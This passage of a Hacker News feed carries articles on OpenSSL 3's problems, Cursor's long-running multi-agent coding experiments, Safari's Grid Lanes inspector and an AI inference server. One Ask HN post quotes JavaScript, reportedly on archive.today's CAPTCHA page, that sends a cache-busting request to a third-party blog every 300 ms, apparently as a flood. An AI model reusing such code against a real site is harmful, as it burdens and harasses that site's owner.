        &lt;p&gt;In the pre-Heartbleed era (pre-2014), OpenSSL was under-maintained and languishing, substantially lagging behind expectations.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;In the immediate post-Heartbleed era, OpenSSL‚Äôs maintenance was reinvigorated and it made substantial progress and improvements. It grew a real code review process, began running tests in CI, adopted fuzz testing, and matured its release process.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Finally, in 2021 OpenSSL 3 was released. OpenSSL 3 introduced new APIs and had large internal refactors. Relative to previous OpenSSL versions, OpenSSL 3 had significant regressions in performance, complexity, API ergonomics, and didn‚Äôt make needed improvements in areas like testing, verification, and memory safety. Over the same period, OpenSSL‚Äôs forks have all made progress in these areas. Many of our concerns about OpenSSL‚Äôs direction in this time have substantial overlap with those highlighted by HAProxy.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The remainder of this post describes the problems we have with OpenSSL in more detail, and concludes with the changes we are making to our own policies in response. To avoid burying the lede, we intend to pursue several approaches to reducing our reliance on OpenSSL.&lt;/p&gt;
    &lt;head rend="h2"&gt;Performance&lt;/head&gt;
    &lt;p&gt;Compared to OpenSSL 1.1.1, OpenSSL 3 has significant performance regressions in areas such as parsing and key loading.&lt;/p&gt;
    &lt;p&gt;Several years ago, we filed a bug reporting that elliptic curve public key loading had regressed 5-8x between OpenSSL 1.1.1 and 3.0.7. The reason we had noticed this is that performance had gotten so bad that we‚Äôd seen it in our test suite runtimes. Since then, OpenSSL has improved performance such that it‚Äôs only 3x slower than it used to be. But more significantly, the response to the issue was that, ‚Äòregression was expected with OpenSSL 3, and while there might be some optimizations, we shouldn‚Äôt expect it to ever get back to 1.1.1 levels‚Äô. Performance regressions can be acceptable, and even appropriate, when they improve other areas of the library, however as we‚Äôll describe, the cause of these regressions has been other mistakes, and not offsetting improvements.&lt;/p&gt;
    &lt;p&gt;As a result of these sorts of regressions, when &lt;code&gt;pyca/cryptography&lt;/code&gt; migrated X.509 certificate parsing from OpenSSL to our own Rust code, we got a 10x performance improvement relative to OpenSSL 3 (n.b., some of this improvement is attributable to advantages in our own code, but much is explainable by the OpenSSL 3 regressions). Later, moving public key parsing to our own Rust code made end-to-end X.509 path validation 60% faster ‚Äî just improving key loading led to a 60% end-to-end improvement, that‚Äôs how extreme the overhead of key parsing in OpenSSL was.&lt;/p&gt;
    &lt;p&gt;The fact that we are able to achieve better performance doing our own parsing makes clear that doing better is practical. And indeed, our performance is not a result of clever SIMD micro-optimizations, it‚Äôs the result of doing simple things that work: we avoid copies, allocations, hash tables, indirect calls, and locks ‚Äî none of which should be required for parsing basic DER structures.&lt;/p&gt;
    &lt;head rend="h2"&gt;Complexity and APIs&lt;/head&gt;
    &lt;p&gt;OpenSSL 3 started the process of substantially changing its APIs ‚Äî it introduced &lt;code&gt;OSSL_PARAM&lt;/code&gt; and has been using those for all new API surfaces (including those for post-quantum cryptographic algorithms). In short, &lt;code&gt;OSSL_PARAM&lt;/code&gt; works by passing arrays of key-value pairs to functions, instead of normal argument passing. This reduces performance, reduces compile-time verification, increases verbosity, and makes code less readable. To the extent there is an argument in favor of it, we infer that the benefit is that it allows OpenSSL to use the same API (and ABI) for different algorithms with different parameters, allowing things like reading algorithm parameters from configuration files with generic configuration parsing code that doesn‚Äôt need to be updated when new algorithms are added to OpenSSL.&lt;/p&gt;
    &lt;p&gt;For a concrete comparison of the verbosity, performing an ML-KEM encapsulation with OpenSSL takes 37 lines with 6 fallible function calls. Doing so with BoringSSL takes 19 lines with 3 fallible function calls.&lt;/p&gt;
    &lt;p&gt;In addition to making public APIs more frustrating and error prone to use, OpenSSL internals have also become more complex. For example, in order to make managing arrays of &lt;code&gt;OSSL_PARAM&lt;/code&gt; palatable, many OpenSSL source files are no longer simply C files, they now have a custom Perl preprocessor for their C code.&lt;/p&gt;
    &lt;p&gt;OpenSSL 3 also introduced the notion of ‚Äúproviders‚Äù (obsoleting, but not replacing, the previous ENGINE APIs), which allow for external implementations of algorithms (including algorithms provided by OpenSSL itself). This was the source of innumerable performance regressions, due to poorly designed APIs. In particular, OpenSSL allowed replacing any algorithm at any point in program execution, which necessitated adding innumerable allocations and locks to nearly every operation. To mitigate this, OpenSSL then added more caches, and ultimately RCU (Read-Copy-Update) ‚Äî a complex memory management strategy which had difficult to diagnose bugs.&lt;/p&gt;
    &lt;p&gt;From our perspective, this is a cycle of compounding bad decisions: the providers API was incorrectly designed (there is no need to be able to redefine SHA-256 at arbitrary points in program execution) leading to performance regressions. This led to additional complexity to mitigate those regressions in the form of caching and RCU, which in term led to more bugs. And after all that, performance was still worse than it had been at the beginning.&lt;/p&gt;
    &lt;p&gt;Finally, taking an OpenSSL public API and attempting to trace the implementation to see how it is implemented has become an exercise in self-flagellation. Being able to read the source to understand how something works is important both as part of self-improvement in software engineering, but also because as sophisticated consumers there are inevitably things about how an implementation works that aren‚Äôt documented, and reading the source gives you ground truth. The number of indirect calls, optional paths, &lt;code&gt;#ifdef&lt;/code&gt;, and other obstacles to comprehension is astounding. We cannot overstate the extent to which just reading the OpenSSL source code has become miserable ‚Äî in a way that both wasn‚Äôt true previously, and isn‚Äôt true in LibreSSL, BoringSSL, or AWS-LC.&lt;/p&gt;
    &lt;head rend="h2"&gt;Testing and Verification&lt;/head&gt;
    &lt;p&gt;We joke that the Python Cryptographic Authority is a CI engineering project that incidentally produces a cryptography library. The joke reflects our real belief that investment in testing and automation enables Pareto improvements in development speed and correctness ‚Äî to the point that it can make other work look trivial.&lt;/p&gt;
    &lt;p&gt;The OpenSSL project does not sufficiently prioritize testing. While OpenSSL‚Äôs testing has improved substantially since the pre-Heartbleed era there are quite significant gaps. The gaps in OpenSSL‚Äôs test coverage were acutely visible during the OpenSSL 3.0 development cycle ‚Äî where the project was extremely reliant on the community to report regressions experienced during the extended alpha and beta period (covering 19 pre-releases over the course of 16 months), because their own tests were insufficient to catch unintended real-world breakages. Despite the known gaps in OpenSSL‚Äôs test coverage, it‚Äôs still common for bug fixes to land without an accompanying regression test.&lt;/p&gt;
    &lt;p&gt;OpenSSL‚Äôs CI is exceptionally flaky, and the OpenSSL project has grown to tolerate this flakiness, which masks serious bugs. OpenSSL 3.0.4 contained a critical buffer overflow in the RSA implementation on AVX-512-capable CPUs. This bug was actually caught by CI ‚Äî but because the crash only occurred when the CI runner happened to have an AVX-512 CPU (not all did), the failures were apparently dismissed as flakiness. Three years later, the project still merges code with failing tests: the day we prepared our conference slides, five of ten recent commits had failing CI checks, and the day before we delivered the talk, every single commit had failing cross-compilation builds.&lt;/p&gt;
    &lt;p&gt;This incident also speaks to the value of adopting tools like Intel SDE, which allows controlled testing against CPUs with different subsets of x86-64 extension instructions. Using Intel SDE to have dedicated test jobs with and without AVX-512 would have made the nature of the failure immediately legible and reproducible.&lt;/p&gt;
    &lt;p&gt;OpenSSL is not keeping pace with the state of the art in formal verification. Formal methods have gone from academic novelty to practical reality for meaningful chunks of cryptographic code. BoringSSL and AWS-LC have incorporated formally verified implementations and use automated reasoning to increase assurance.&lt;/p&gt;
    &lt;head rend="h2"&gt;Memory Safety&lt;/head&gt;
    &lt;p&gt;At the time OpenSSL was created, there were no programming languages that meaningfully provided performance, embeddability, and memory safety ‚Äî if you wanted a memory safe language, you were committing to giving up performance and adding a garbage collector.&lt;/p&gt;
    &lt;p&gt;The world has changed. Nearly 5 years ago, &lt;code&gt;pyca/cryptography&lt;/code&gt; issued our first release incorporating Rust code, and since then we have migrated nearly all functionality to Rust, using a mix of pure-Rust for all parsing and X.509 operations combined with using OpenSSL for providing cryptographic algorithms ‚Äî gaining performance wins and avoiding several OpenSSL CVEs. We know these transitions are possible.&lt;/p&gt;
    &lt;p&gt;A library committed to security needs to make a long-term commitment to a migration to a memory safe programming language. OpenSSL has shown no initiative at all on this issue.&lt;/p&gt;
    &lt;head rend="h2"&gt;Contributing Causes&lt;/head&gt;
    &lt;p&gt;Whenever issues with an open source project are raised, many will suggest this is an issue of funding or tragedy of the commons. This is inapposite, in the past decade, post-Heartbleed, OpenSSL has received considerable funding, and at this moment the OpenSSL Corporation and Foundation employ more software engineers than work full time on either BoringSSL or LibreSSL. The problems we have described are not ones caused by underfunding.&lt;/p&gt;
    &lt;p&gt;We do not fully understand the motivations that led to the public APIs and internal complexity we‚Äôve described here. We‚Äôve done our best to reverse engineer them by asking ‚Äúwhat would motivate someone to do this‚Äù and often we‚Äôve found ourselves coming up short. The fact that none of the other OpenSSL forks have made these same design choices is informative to the question of ‚Äúwas this necessary‚Äù.&lt;/p&gt;
    &lt;head rend="h2"&gt;Future Directions&lt;/head&gt;
    &lt;p&gt;Our experience with OpenSSL has been on a negative trajectory for several years. As a result of these issues, we are making the following changes to our (admittedly undocumented) policies.&lt;/p&gt;
    &lt;p&gt;First, we will no longer require OpenSSL implementations for new functionality. Where we deem it desirable, we will add new APIs that are only on LibreSSL/BoringSSL/AWS-LC. Concretely, we expect to add ML-KEM and ML-DSA APIs that are only available with LibreSSL/BoringSSL/AWS-LC, and not with OpenSSL.&lt;/p&gt;
    &lt;p&gt;Second, we currently statically link a copy of OpenSSL in our wheels (binary artifacts). We are beginning the process of looking into what would be required to change our wheels to link against one of the OpenSSL forks.&lt;/p&gt;
    &lt;p&gt;If we are able to successfully switch to one of OpenSSL‚Äôs forks for our binary wheels, we will begin considering the circumstances under which we would drop support for OpenSSL entirely.&lt;/p&gt;
    &lt;p&gt;Lastly, in the long term, we are actively tracking non-OpenSSL derived cryptography libraries such as Graviola as potential alternatives.&lt;/p&gt;
    &lt;p&gt;We recognize that changes in which libraries we use to provide cryptographic implementations have substantial impact on our users ‚Äî particularly redistributors. We do not contemplate these steps lightly, nor do we anticipate making them hastily. However, due to the gravity of our concerns, we are compelled to act. If you rely on &lt;code&gt;pyca/cryptography&lt;/code&gt;‚Äôs support for OpenSSL, the best way to avoid the most drastic steps contemplated here is to engage with the OpenSSL project and contribute to improvements on these axes.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://cryptography.io/en/latest/statements/state-of-openssl/"/><published>2026-01-14T22:04:10+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46624541</id><title>Scaling long-running autonomous coding</title><updated>2026-01-15T05:17:49.058665+00:00</updated><content>&lt;doc fingerprint="9ff1b067ed89904f"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Scaling long-running autonomous coding&lt;/head&gt;
    &lt;p&gt;We've been experimenting with running coding agents autonomously for weeks.&lt;/p&gt;
    &lt;p&gt;Our goal is to understand how far we can push the frontier of agentic coding for projects that typically take human teams months to complete.&lt;/p&gt;
    &lt;p&gt;This post describes what we've learned from running hundreds of concurrent agents on a single project, coordinating their work, and watching them write over a million lines of code and trillions of tokens.&lt;/p&gt;
    &lt;head rend="h2"&gt;The limits of a single agent&lt;/head&gt;
    &lt;p&gt;Today's agents work well for focused tasks, but are slow for complex projects. The natural next step is to run multiple agents in parallel, but figuring out how to coordinate them is challenging.&lt;/p&gt;
    &lt;p&gt;Our first instinct was that planning ahead would be too rigid. The path through a large project is ambiguous, and the right division of work isn't obvious at the start. We began with dynamic coordination, where agents decide what to do based on what others are currently doing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Learning to coordinate&lt;/head&gt;
    &lt;p&gt;Our initial approach gave agents equal status and let them self-coordinate through a shared file. Each agent would check what others were doing, claim a task, and update its status. To prevent two agents from grabbing the same task, we used a locking mechanism.&lt;/p&gt;
    &lt;p&gt;This failed in interesting ways:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Agents would hold locks for too long, or forget to release them entirely. Even when locking worked correctly, it became a bottleneck. Twenty agents would slow down to the effective throughput of two or three, with most time spent waiting.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The system was brittle: agents could fail while holding locks, try to acquire locks they already held, or update the coordination file without acquiring the lock at all.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;We tried replacing locks with optimistic concurrency control. Agents could read state freely, but writes would fail if the state had changed since they last read it. This was simpler and more robust, but there were still deeper problems.&lt;/p&gt;
    &lt;p&gt;With no hierarchy, agents became risk-averse. They avoided difficult tasks and made small, safe changes instead. No agent took responsibility for hard problems or end-to-end implementation. This lead to work churning for long periods of time without progress.&lt;/p&gt;
    &lt;head rend="h2"&gt;Planners and workers&lt;/head&gt;
    &lt;p&gt;Our next approach was to separate roles. Instead of a flat structure where every agent does everything, we created a pipeline with distinct responsibilities.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Planners continuously explore the codebase and create tasks. They can spawn sub-planners for specific areas, making planning itself parallel and recursive.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Workers pick up tasks and focus entirely on completing them. They don't coordinate with other workers or worry about the big picture. They just grind on their assigned task until it's done, then push their changes.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;At the end of each cycle, a judge agent determined whether to continue, then the next iteration would start fresh. This solved most of our coordination problems and let us scale to very large projects without any single agent getting tunnel vision.&lt;/p&gt;
    &lt;head rend="h2"&gt;Running for weeks&lt;/head&gt;
    &lt;p&gt;To test this system, we pointed it at an ambitious goal: building a web browser from scratch. The agents ran for close to a week, writing over 1 million lines of code across 1,000 files. You can explore the source code on GitHub.&lt;/p&gt;
    &lt;p&gt;Despite the codebase size, new agents can still understand it and make meaningful progress. Hundreds of workers run concurrently, pushing to the same branch with minimal conflicts.&lt;/p&gt;
    &lt;p&gt;While it might seem like a simple screenshot, building a browser from scratch is extremely difficult.&lt;/p&gt;
    &lt;p&gt;Another experiment was doing an in-place migration of Solid to React in the Cursor codebase. It took over 3 weeks with +266K/-193K edits. As we've started to test the changes, we do believe it's possible to merge this change.&lt;/p&gt;
    &lt;p&gt;Another experiment was to improve an upcoming product. A long-running agent made video rendering 25x faster with an efficient Rust version. It also added support to zoom and pan smoothly with natural spring transitions and motion blurs, following the cursor. This code was merged and will be in production soon.&lt;/p&gt;
    &lt;p&gt;We have a few other interesting examples still running:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Java LSP: 7.4K commits, 550K LoC&lt;/item&gt;
      &lt;item&gt;Windows 7 emulator: 14.6K commits, 1.2M LoC&lt;/item&gt;
      &lt;item&gt;Excel: 12K commits, 1.6M LoC&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;What we've learned&lt;/head&gt;
    &lt;p&gt;We've deployed billions of tokens across these agents toward a single goal. The system isn't perfectly efficient, but it's far more effective than we expected.&lt;/p&gt;
    &lt;p&gt;Model choice matters for extremely long-running tasks. We found that GPT-5.2 models are much better at extended autonomous work: following instructions, keeping focus, avoiding drift, and implementing things precisely and completely.&lt;/p&gt;
    &lt;p&gt;Opus 4.5 tends to stop earlier and take shortcuts when convenient, yielding back control quickly. We also found that different models excel at different roles. GPT-5.2 is a better planner than GPT-5.1-codex, even though the latter is trained specifically for coding. We now use the model best suited for each role rather than one universal model.&lt;/p&gt;
    &lt;p&gt;Many of our improvements came from removing complexity rather than adding it. We initially built an integrator role for quality control and conflict resolution, but found it created more bottlenecks than it solved. Workers were already capable of handling conflicts themselves.&lt;/p&gt;
    &lt;p&gt;The best system is often simpler than you'd expect. We initially tried to model systems from distributed computing and organizational design. However, not all of them work for agents.&lt;/p&gt;
    &lt;p&gt;The right amount of structure is somewhere in the middle. Too little structure and agents conflict, duplicate work, and drift. Too much structure creates fragility.&lt;/p&gt;
    &lt;p&gt;A surprising amount of the system's behavior comes down to how we prompt the agents. Getting them to coordinate well, avoid pathological behaviors, and maintain focus over long periods required extensive experimentation. The harness and models matter, but the prompts matter more.&lt;/p&gt;
    &lt;head rend="h2"&gt;What's next&lt;/head&gt;
    &lt;p&gt;Multi-agent coordination remains a hard problem. Our current system works, but we're nowhere near optimal. Planners should wake up when their tasks complete to plan the next step. Agents occasionally run for far too long. We still need periodic fresh starts to combat drift and tunnel vision.&lt;/p&gt;
    &lt;p&gt;But the core question, can we scale autonomous coding by throwing more agents at a problem, has a more optimistic answer than we expected. Hundreds of agents can work together on a single codebase for weeks, making real progress on ambitious projects.&lt;/p&gt;
    &lt;p&gt;The techniques we're developing here will eventually inform Cursor's agent capabilities. If you're interested in working on the hardest problems in AI-assisted software development, we'd love to hear from you at hiring@cursor.com.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://cursor.com/blog/scaling-agents"/><published>2026-01-14T22:18:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46624731</id><title>ChromaDB Explorer</title><updated>2026-01-15T05:17:48.857187+00:00</updated><content>&lt;doc fingerprint="6945c94fdd3bb92b"&gt;
  &lt;main&gt;
    &lt;p&gt;A modern, native desktop client for ChromaDB. Browse collections, search semantically, and manage your vector embeddings with ease.&lt;/p&gt;
    &lt;p&gt;Everything you need to work with ChromaDB, in a beautiful native app.&lt;/p&gt;
    &lt;p&gt;Connect to local, remote, or Chroma Cloud databases. Save and manage multiple connection profiles with secure API key storage.&lt;/p&gt;
    &lt;p&gt;Create, copy, and configure collections with ease. Set custom embedding functions and HNSW parameters.&lt;/p&gt;
    &lt;p&gt;Search your documents using natural language. Find similar content instantly with vector similarity search.&lt;/p&gt;
    &lt;p&gt;Built-in support for OpenAI, Cohere, Gemini, Ollama, Jina, Mistral, Voyage AI, and more.&lt;/p&gt;
    &lt;p&gt;Browse, create, edit, and delete documents. Batch operations for efficient bulk document management.&lt;/p&gt;
    &lt;p&gt;Beautiful glass morphism design that feels right at home on your Mac.&lt;/p&gt;
    &lt;p&gt;See Chroma Explorer in action.&lt;/p&gt;
    &lt;p&gt;Get Chroma Explorer for macOS and start exploring your vector databases today.&lt;/p&gt;
    &lt;p&gt;Requires macOS 11.0 or later&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.chroma-explorer.com/"/><published>2026-01-14T22:30:16+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46624740</id><title>Ask HN: Weird archive.today behavior?</title><updated>2026-01-15T05:17:48.542479+00:00</updated><content>&lt;doc fingerprint="1205135739c6c913"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;archive.today has recently (I noticed this, like, 3 days ago) started automatically making requests to someone's personal blog on their CAPTCHA page. Here's a screenshot of what I'm talking about: https://files.catbox.moe/20jsle.png&lt;/p&gt;
      &lt;p&gt;The relevant JS is:&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;   setInterval(function() {
     fetch("https://gyrovague.com/?s=" + Math.round(new Date().getTime() % 10000000), {
       referrerPolicy: "no-referrer",
       mode: "no-cors"
     });
   }, 300);
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt; Looking at this blog, there seems to be exactly one article mentioning archive.today - "archive.today: On the trail of the mysterious guerrilla archivist of the Internet" (https://gyrovague.com/2023/08/05/archive-today-on-the-trail-of-the-mysterious-guerrilla-archivist-of-the-internet/), where the person running the blog digs up some information about archive's owner.&lt;/p&gt;
      &lt;p&gt;So perhaps this is some kind of revenge/DOS attack attempt/deliberately wasting their bandwidth in response to this article? Maybe an attempt to silence them and force to delete their article? But if it is, then I have so many questions. Like, why would the owner of the archive do that 2.5 years after the article was published? Or why would they even do that in the first place, do they not know about Streisand effect?&lt;/p&gt;
      &lt;p&gt;I'm confused.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46624740"/><published>2026-01-14T22:30:40+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46626210</id><title>New Safari developer tools provide insight into CSS Grid Lanes</title><updated>2026-01-15T05:17:48.019876+00:00</updated><content>&lt;doc fingerprint="b71e011275b5ebb3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;New Safari developer tools provide insight into CSS Grid Lanes&lt;/head&gt;
    &lt;p&gt;You might have heard recently that Safari Technology Preview 234 landed the final plan for supporting masonry-style layouts in CSS. It‚Äôs called Grid Lanes.&lt;/p&gt;
    &lt;p&gt;CSS Grid Lanes adds a whole new capability to CSS Grid. It lets you line up content in either columns or rows ‚Äî and not both.&lt;/p&gt;
    &lt;p&gt;This layout pattern allows content of various aspect ratios to pack together. No longer do you need to truncate content artificially to make it fit. Plus, the content that‚Äôs earlier in the HTML gets grouped together towards the start of the container. If new items get lazy loaded, they appear at the end without reshuffling what‚Äôs already on screen.&lt;/p&gt;
    &lt;p&gt;It can be tricky to understand the content flow pattern as you are learning Grid Lanes. The content is not flowing down the first column to the very bottom of the container, and then back up to the top of the second column. (If you want that pattern, use CSS Multicolumn or Flexbox.)&lt;/p&gt;
    &lt;p&gt;With Grid Lanes, the content flows perpendicular to the layout shape you created. When you define columns, the content flows back and forth across those columns, just like to how it would if rows existed. If you define rows, the content will flow up and down through the rows ‚Äî in the column direction, as if columns were there.&lt;/p&gt;
    &lt;p&gt;Having a way to see the order of items can make it easier to understand this content flow. Introducing the CSS Grid Lanes Inspector in Safari. It‚Äôs just the regular Grid Inspector, now with more features.&lt;/p&gt;
    &lt;p&gt;Safari‚Äôs Grid Inspector already reveals the grid lines for Grid Lanes, and labels track sizes, line numbers, line names, and area names. Now it has a new feature ‚Äî ‚ÄúOrder Numbers‚Äù.&lt;/p&gt;
    &lt;p&gt;By turning on the order numbers in the example above, we can clearly see how Item 1, 2, 3, and 4 flow across the columns, as if there were a row. Then Item 5 is in the middle right, followed by Item 6 on the far right, and so on.&lt;/p&gt;
    &lt;p&gt;You might be tempted to believe the content order doesn‚Äôt matter. With pages like this photo gallery ‚Äî most users will have no idea how the photos are ordered in the HTML. But for many users, the content order has a big impact on their experience. You should always consider what it‚Äôs like to tab through content ‚Äî watching one item after another sequentially come into focus. Consider what it‚Äôs like to listen to the site through a screenreader while navigating by touch or keyboard. With Grid Lanes, you can adjust &lt;code&gt;flow-tolerance&lt;/code&gt; to reduce the jumping around and put items where people expect.&lt;/p&gt;
    &lt;p&gt;To know which value for flow tolerance to choose, it really helps to quickly see the order of items. That makes it immediately clear how your CSS impacts the result.&lt;/p&gt;
    &lt;p&gt;Order Numbers in the Grid Inspector is an extension of a feature Safari‚Äôs Flexbox Inspector has had since Safari 16.0 ‚Äî marking the order of Flex items. Seeing content order is also helpful when using the &lt;code&gt;order&lt;/code&gt; property in Flexbox.&lt;/p&gt;
    &lt;p&gt;Order Numbers in Safari‚Äôs Grid Inspector works for CSS Grid and Subgrid, as well as Grid Lanes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Safari‚Äôs layout tooling&lt;/head&gt;
    &lt;p&gt;The Grid and Flexbox layout inspectors might seem similar across browsers, but the team behind Safari‚Äôs Web Inspector has taken the time to finely polish the details. In both the Grid and Flexbox Inspectors, you can simultaneously activate as many overlays as you want. No limits. And no janky scrolling due to performance struggles.&lt;/p&gt;
    &lt;p&gt;Safari‚Äôs Flexbox Inspector visually distinguishes between excess free space and Flex gaps, since knowing which is which can solve confusion. It shows the boundaries of items, revealing how they are distributed both on the main axis and the cross axis of Flexbox containers. And it lists all the Flexbox containers, making it easier to understand what‚Äôs happening overall.&lt;/p&gt;
    &lt;p&gt;Our Grid Inspector has a simple and clear interface, making it easy to understand the options. It also lists all Grid containers. And of course, you can change the default colors of the overlays, to best contrast with your site content.&lt;/p&gt;
    &lt;p&gt;And Safari‚Äôs Grid and Flexbox Inspectors are the only browser devtools that label content order. We hope seeing the order of content in Grid Lanes helps you understand it more thoroughly and enjoy using this powerful new layout mechanism.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try out Order Numbers&lt;/head&gt;
    &lt;p&gt;Order Numbers in Safari‚Äôs Grid Inspector shipped today in Safari Technology Preview 235. Let us know what you think. There‚Äôs still time to polish the details to make the most helpful tool possible. You can ping Jen Simmons on Bluesky or Mastodon with links, comments and ideas.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://webkit.org/blog/17746/new-safari-developer-tools-provide-insight-into-css-grid-lanes/"/><published>2026-01-15T00:34:59+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46626410</id><title>Furiosa: 3.5x efficiency over H100s</title><updated>2026-01-15T05:17:47.406334+00:00</updated><content>&lt;doc fingerprint="a19ed41a2a13478a"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing Furiosa NXT RNGD Server: Efficient AI inference at data center scale&lt;/head&gt;
    &lt;p&gt;News&lt;/p&gt;
    &lt;p&gt;We are excited to introduce FuriosaAI‚Äôs NXT RNGD Server‚Äîour first branded, turnkey solution for AI inference.&lt;/p&gt;
    &lt;p&gt;Built around our RNGD accelerators, NXT RNGD Server is an optimized system that delivers high performance on today‚Äôs most important AI workloads while fitting seamlessly into existing data center environments.&lt;/p&gt;
    &lt;p&gt;With NXT RNGD Server, enterprises can move from experimentation to deployment faster than ever. The system ships with the Furiosa SDK and Furiosa LLM runtime preinstalled, so applications can serve immediately upon installation. We optimized the platform over standard PCIe interconnects, eliminating the need for proprietary fabrics or exotic infrastructure.&lt;/p&gt;
    &lt;p&gt;Designed for compatibility, NXT RNGD Server runs at just 3 kW per system, allowing organizations to scale AI within the power and cooling limits of most modern facilities. This makes NXT RNGD Server a practical and cost-effective system to build out AI factories inside the data centers enterprises already operate.&lt;/p&gt;
    &lt;head rend="h2"&gt;Technical Specifications&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;Compute: Up to 8 √ó RNGD accelerators (4 petaFLOPS FP8 per server) with dual AMD EPYC processors. Supports BF16, FP8, INT8, and INT4&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Memory: 384 GB HBM3 (12 TB/s bandwidth) plus 1 TB DDR5 system memory&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Storage: 2 √ó 960 GB NVMe M.2 (OS), 2 √ó 3.84 TB NVMe U.2 (internal)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Networking: 1G management NIC plus 2 √ó 25G data NICs&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Power &amp;amp; Cooling: 3 kW system power, redundant 2,000 W Titanium PSUs, air-cooled&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Security &amp;amp; Management: Secure Boot, TPM, BMC attestation, dual management paths (PCIe + I2C)&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Software: Preinstalled Furiosa SDK and Furiosa LLM runtime with native Kubernetes and Helm integration&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Real-world benefits and proven performance&lt;/head&gt;
    &lt;p&gt;NXT RNGD Server‚Äôs superior power efficiency significantly lowers businesses‚Äô TCO. Enterprise customers can run advanced AI efficiently at scale within current infrastructure and power limitations ‚Äì using on-prem servers or cloud data centers. This is crucial for leveraging existing infrastructure, since more than 80% of data centers today are air-cooled and operate at 8 kW per rack or less. &lt;/p&gt;
    &lt;p&gt;For businesses with sensitive workloads, regulatory compliance requirements, or enhanced privacy and security needs, NXT RNGD Server offers complete control over enterprise data, with model weights running entirely on local infrastructure.&lt;/p&gt;
    &lt;p&gt;Global enterprises have validated NXT RNGD Server‚Äôs performance. In July, LG AI Research announced that it has adopted RNGD for inference computing with its EXAONE models. Running LG‚Äôs EXAONE 3.5 32B model on a single server with four RNGD cards and a batch size of one, LG AI Research achieved 60 tokens/second with a 4K context window and 50 tokens/second with a 32K context window.&lt;/p&gt;
    &lt;p&gt;We are now working with LG AI Research to supply NXT RNGD servers to enterprises using EXAONE across key sectors, including electronics, finance, telecommunications, and biotechnology.&lt;/p&gt;
    &lt;head rend="h2"&gt;Making rapid deployment of advanced AI available to everyone&lt;/head&gt;
    &lt;p&gt;With global data center demand at 60 GW in 2024 and expected to triple by the end of the decade, the industry faces a once-in-a-generation transformation. More than 80 percent of facilities today are air-cooled and operate at 8 kW per rack or less, making them poorly suited for GPU-based systems that require liquid cooling and 10 kW+ per server.&lt;/p&gt;
    &lt;p&gt;NXT RNGD Server provides a practical path forward. It allows organizations to deploy advanced AI within their existing facilities, without prohibitive energy costs or disruptive retrofits. Engineered as a plug-and-play system, NXT RNGD combines AI-optimized silicon with Furiosa LLM, a vLLM-compatible serving framework featuring built-in OpenAI API support, enabling organizations to deploy and scale AI workloads from day one.&lt;/p&gt;
    &lt;p&gt;By combining silicon and system design, NXT RNGD Server makes efficient, enterprise-ready, and future-proof AI infrastructure a reality.&lt;/p&gt;
    &lt;head rend="h2"&gt;Availability&lt;/head&gt;
    &lt;p&gt;We are taking inquiries and orders for January 2026.&lt;/p&gt;
    &lt;p&gt;Download the datasheet here and sign up for RNGD updates here.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://furiosa.ai/blog/introducing-rngd-server-efficient-ai-inference-at-data-center-scale"/><published>2026-01-15T00:53:21+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46626639</id><title>Ask HN: What is the best way to provide continuous context to models?</title><updated>2026-01-15T05:17:47.112727+00:00</updated><content>&lt;doc fingerprint="e5469d1708afd747"&gt;
  &lt;main&gt;
    &lt;p&gt;With research done till date, what according to you is the best way to provide context to a model. Are there any articles that go into depth of how Cursor does it?&lt;/p&gt;
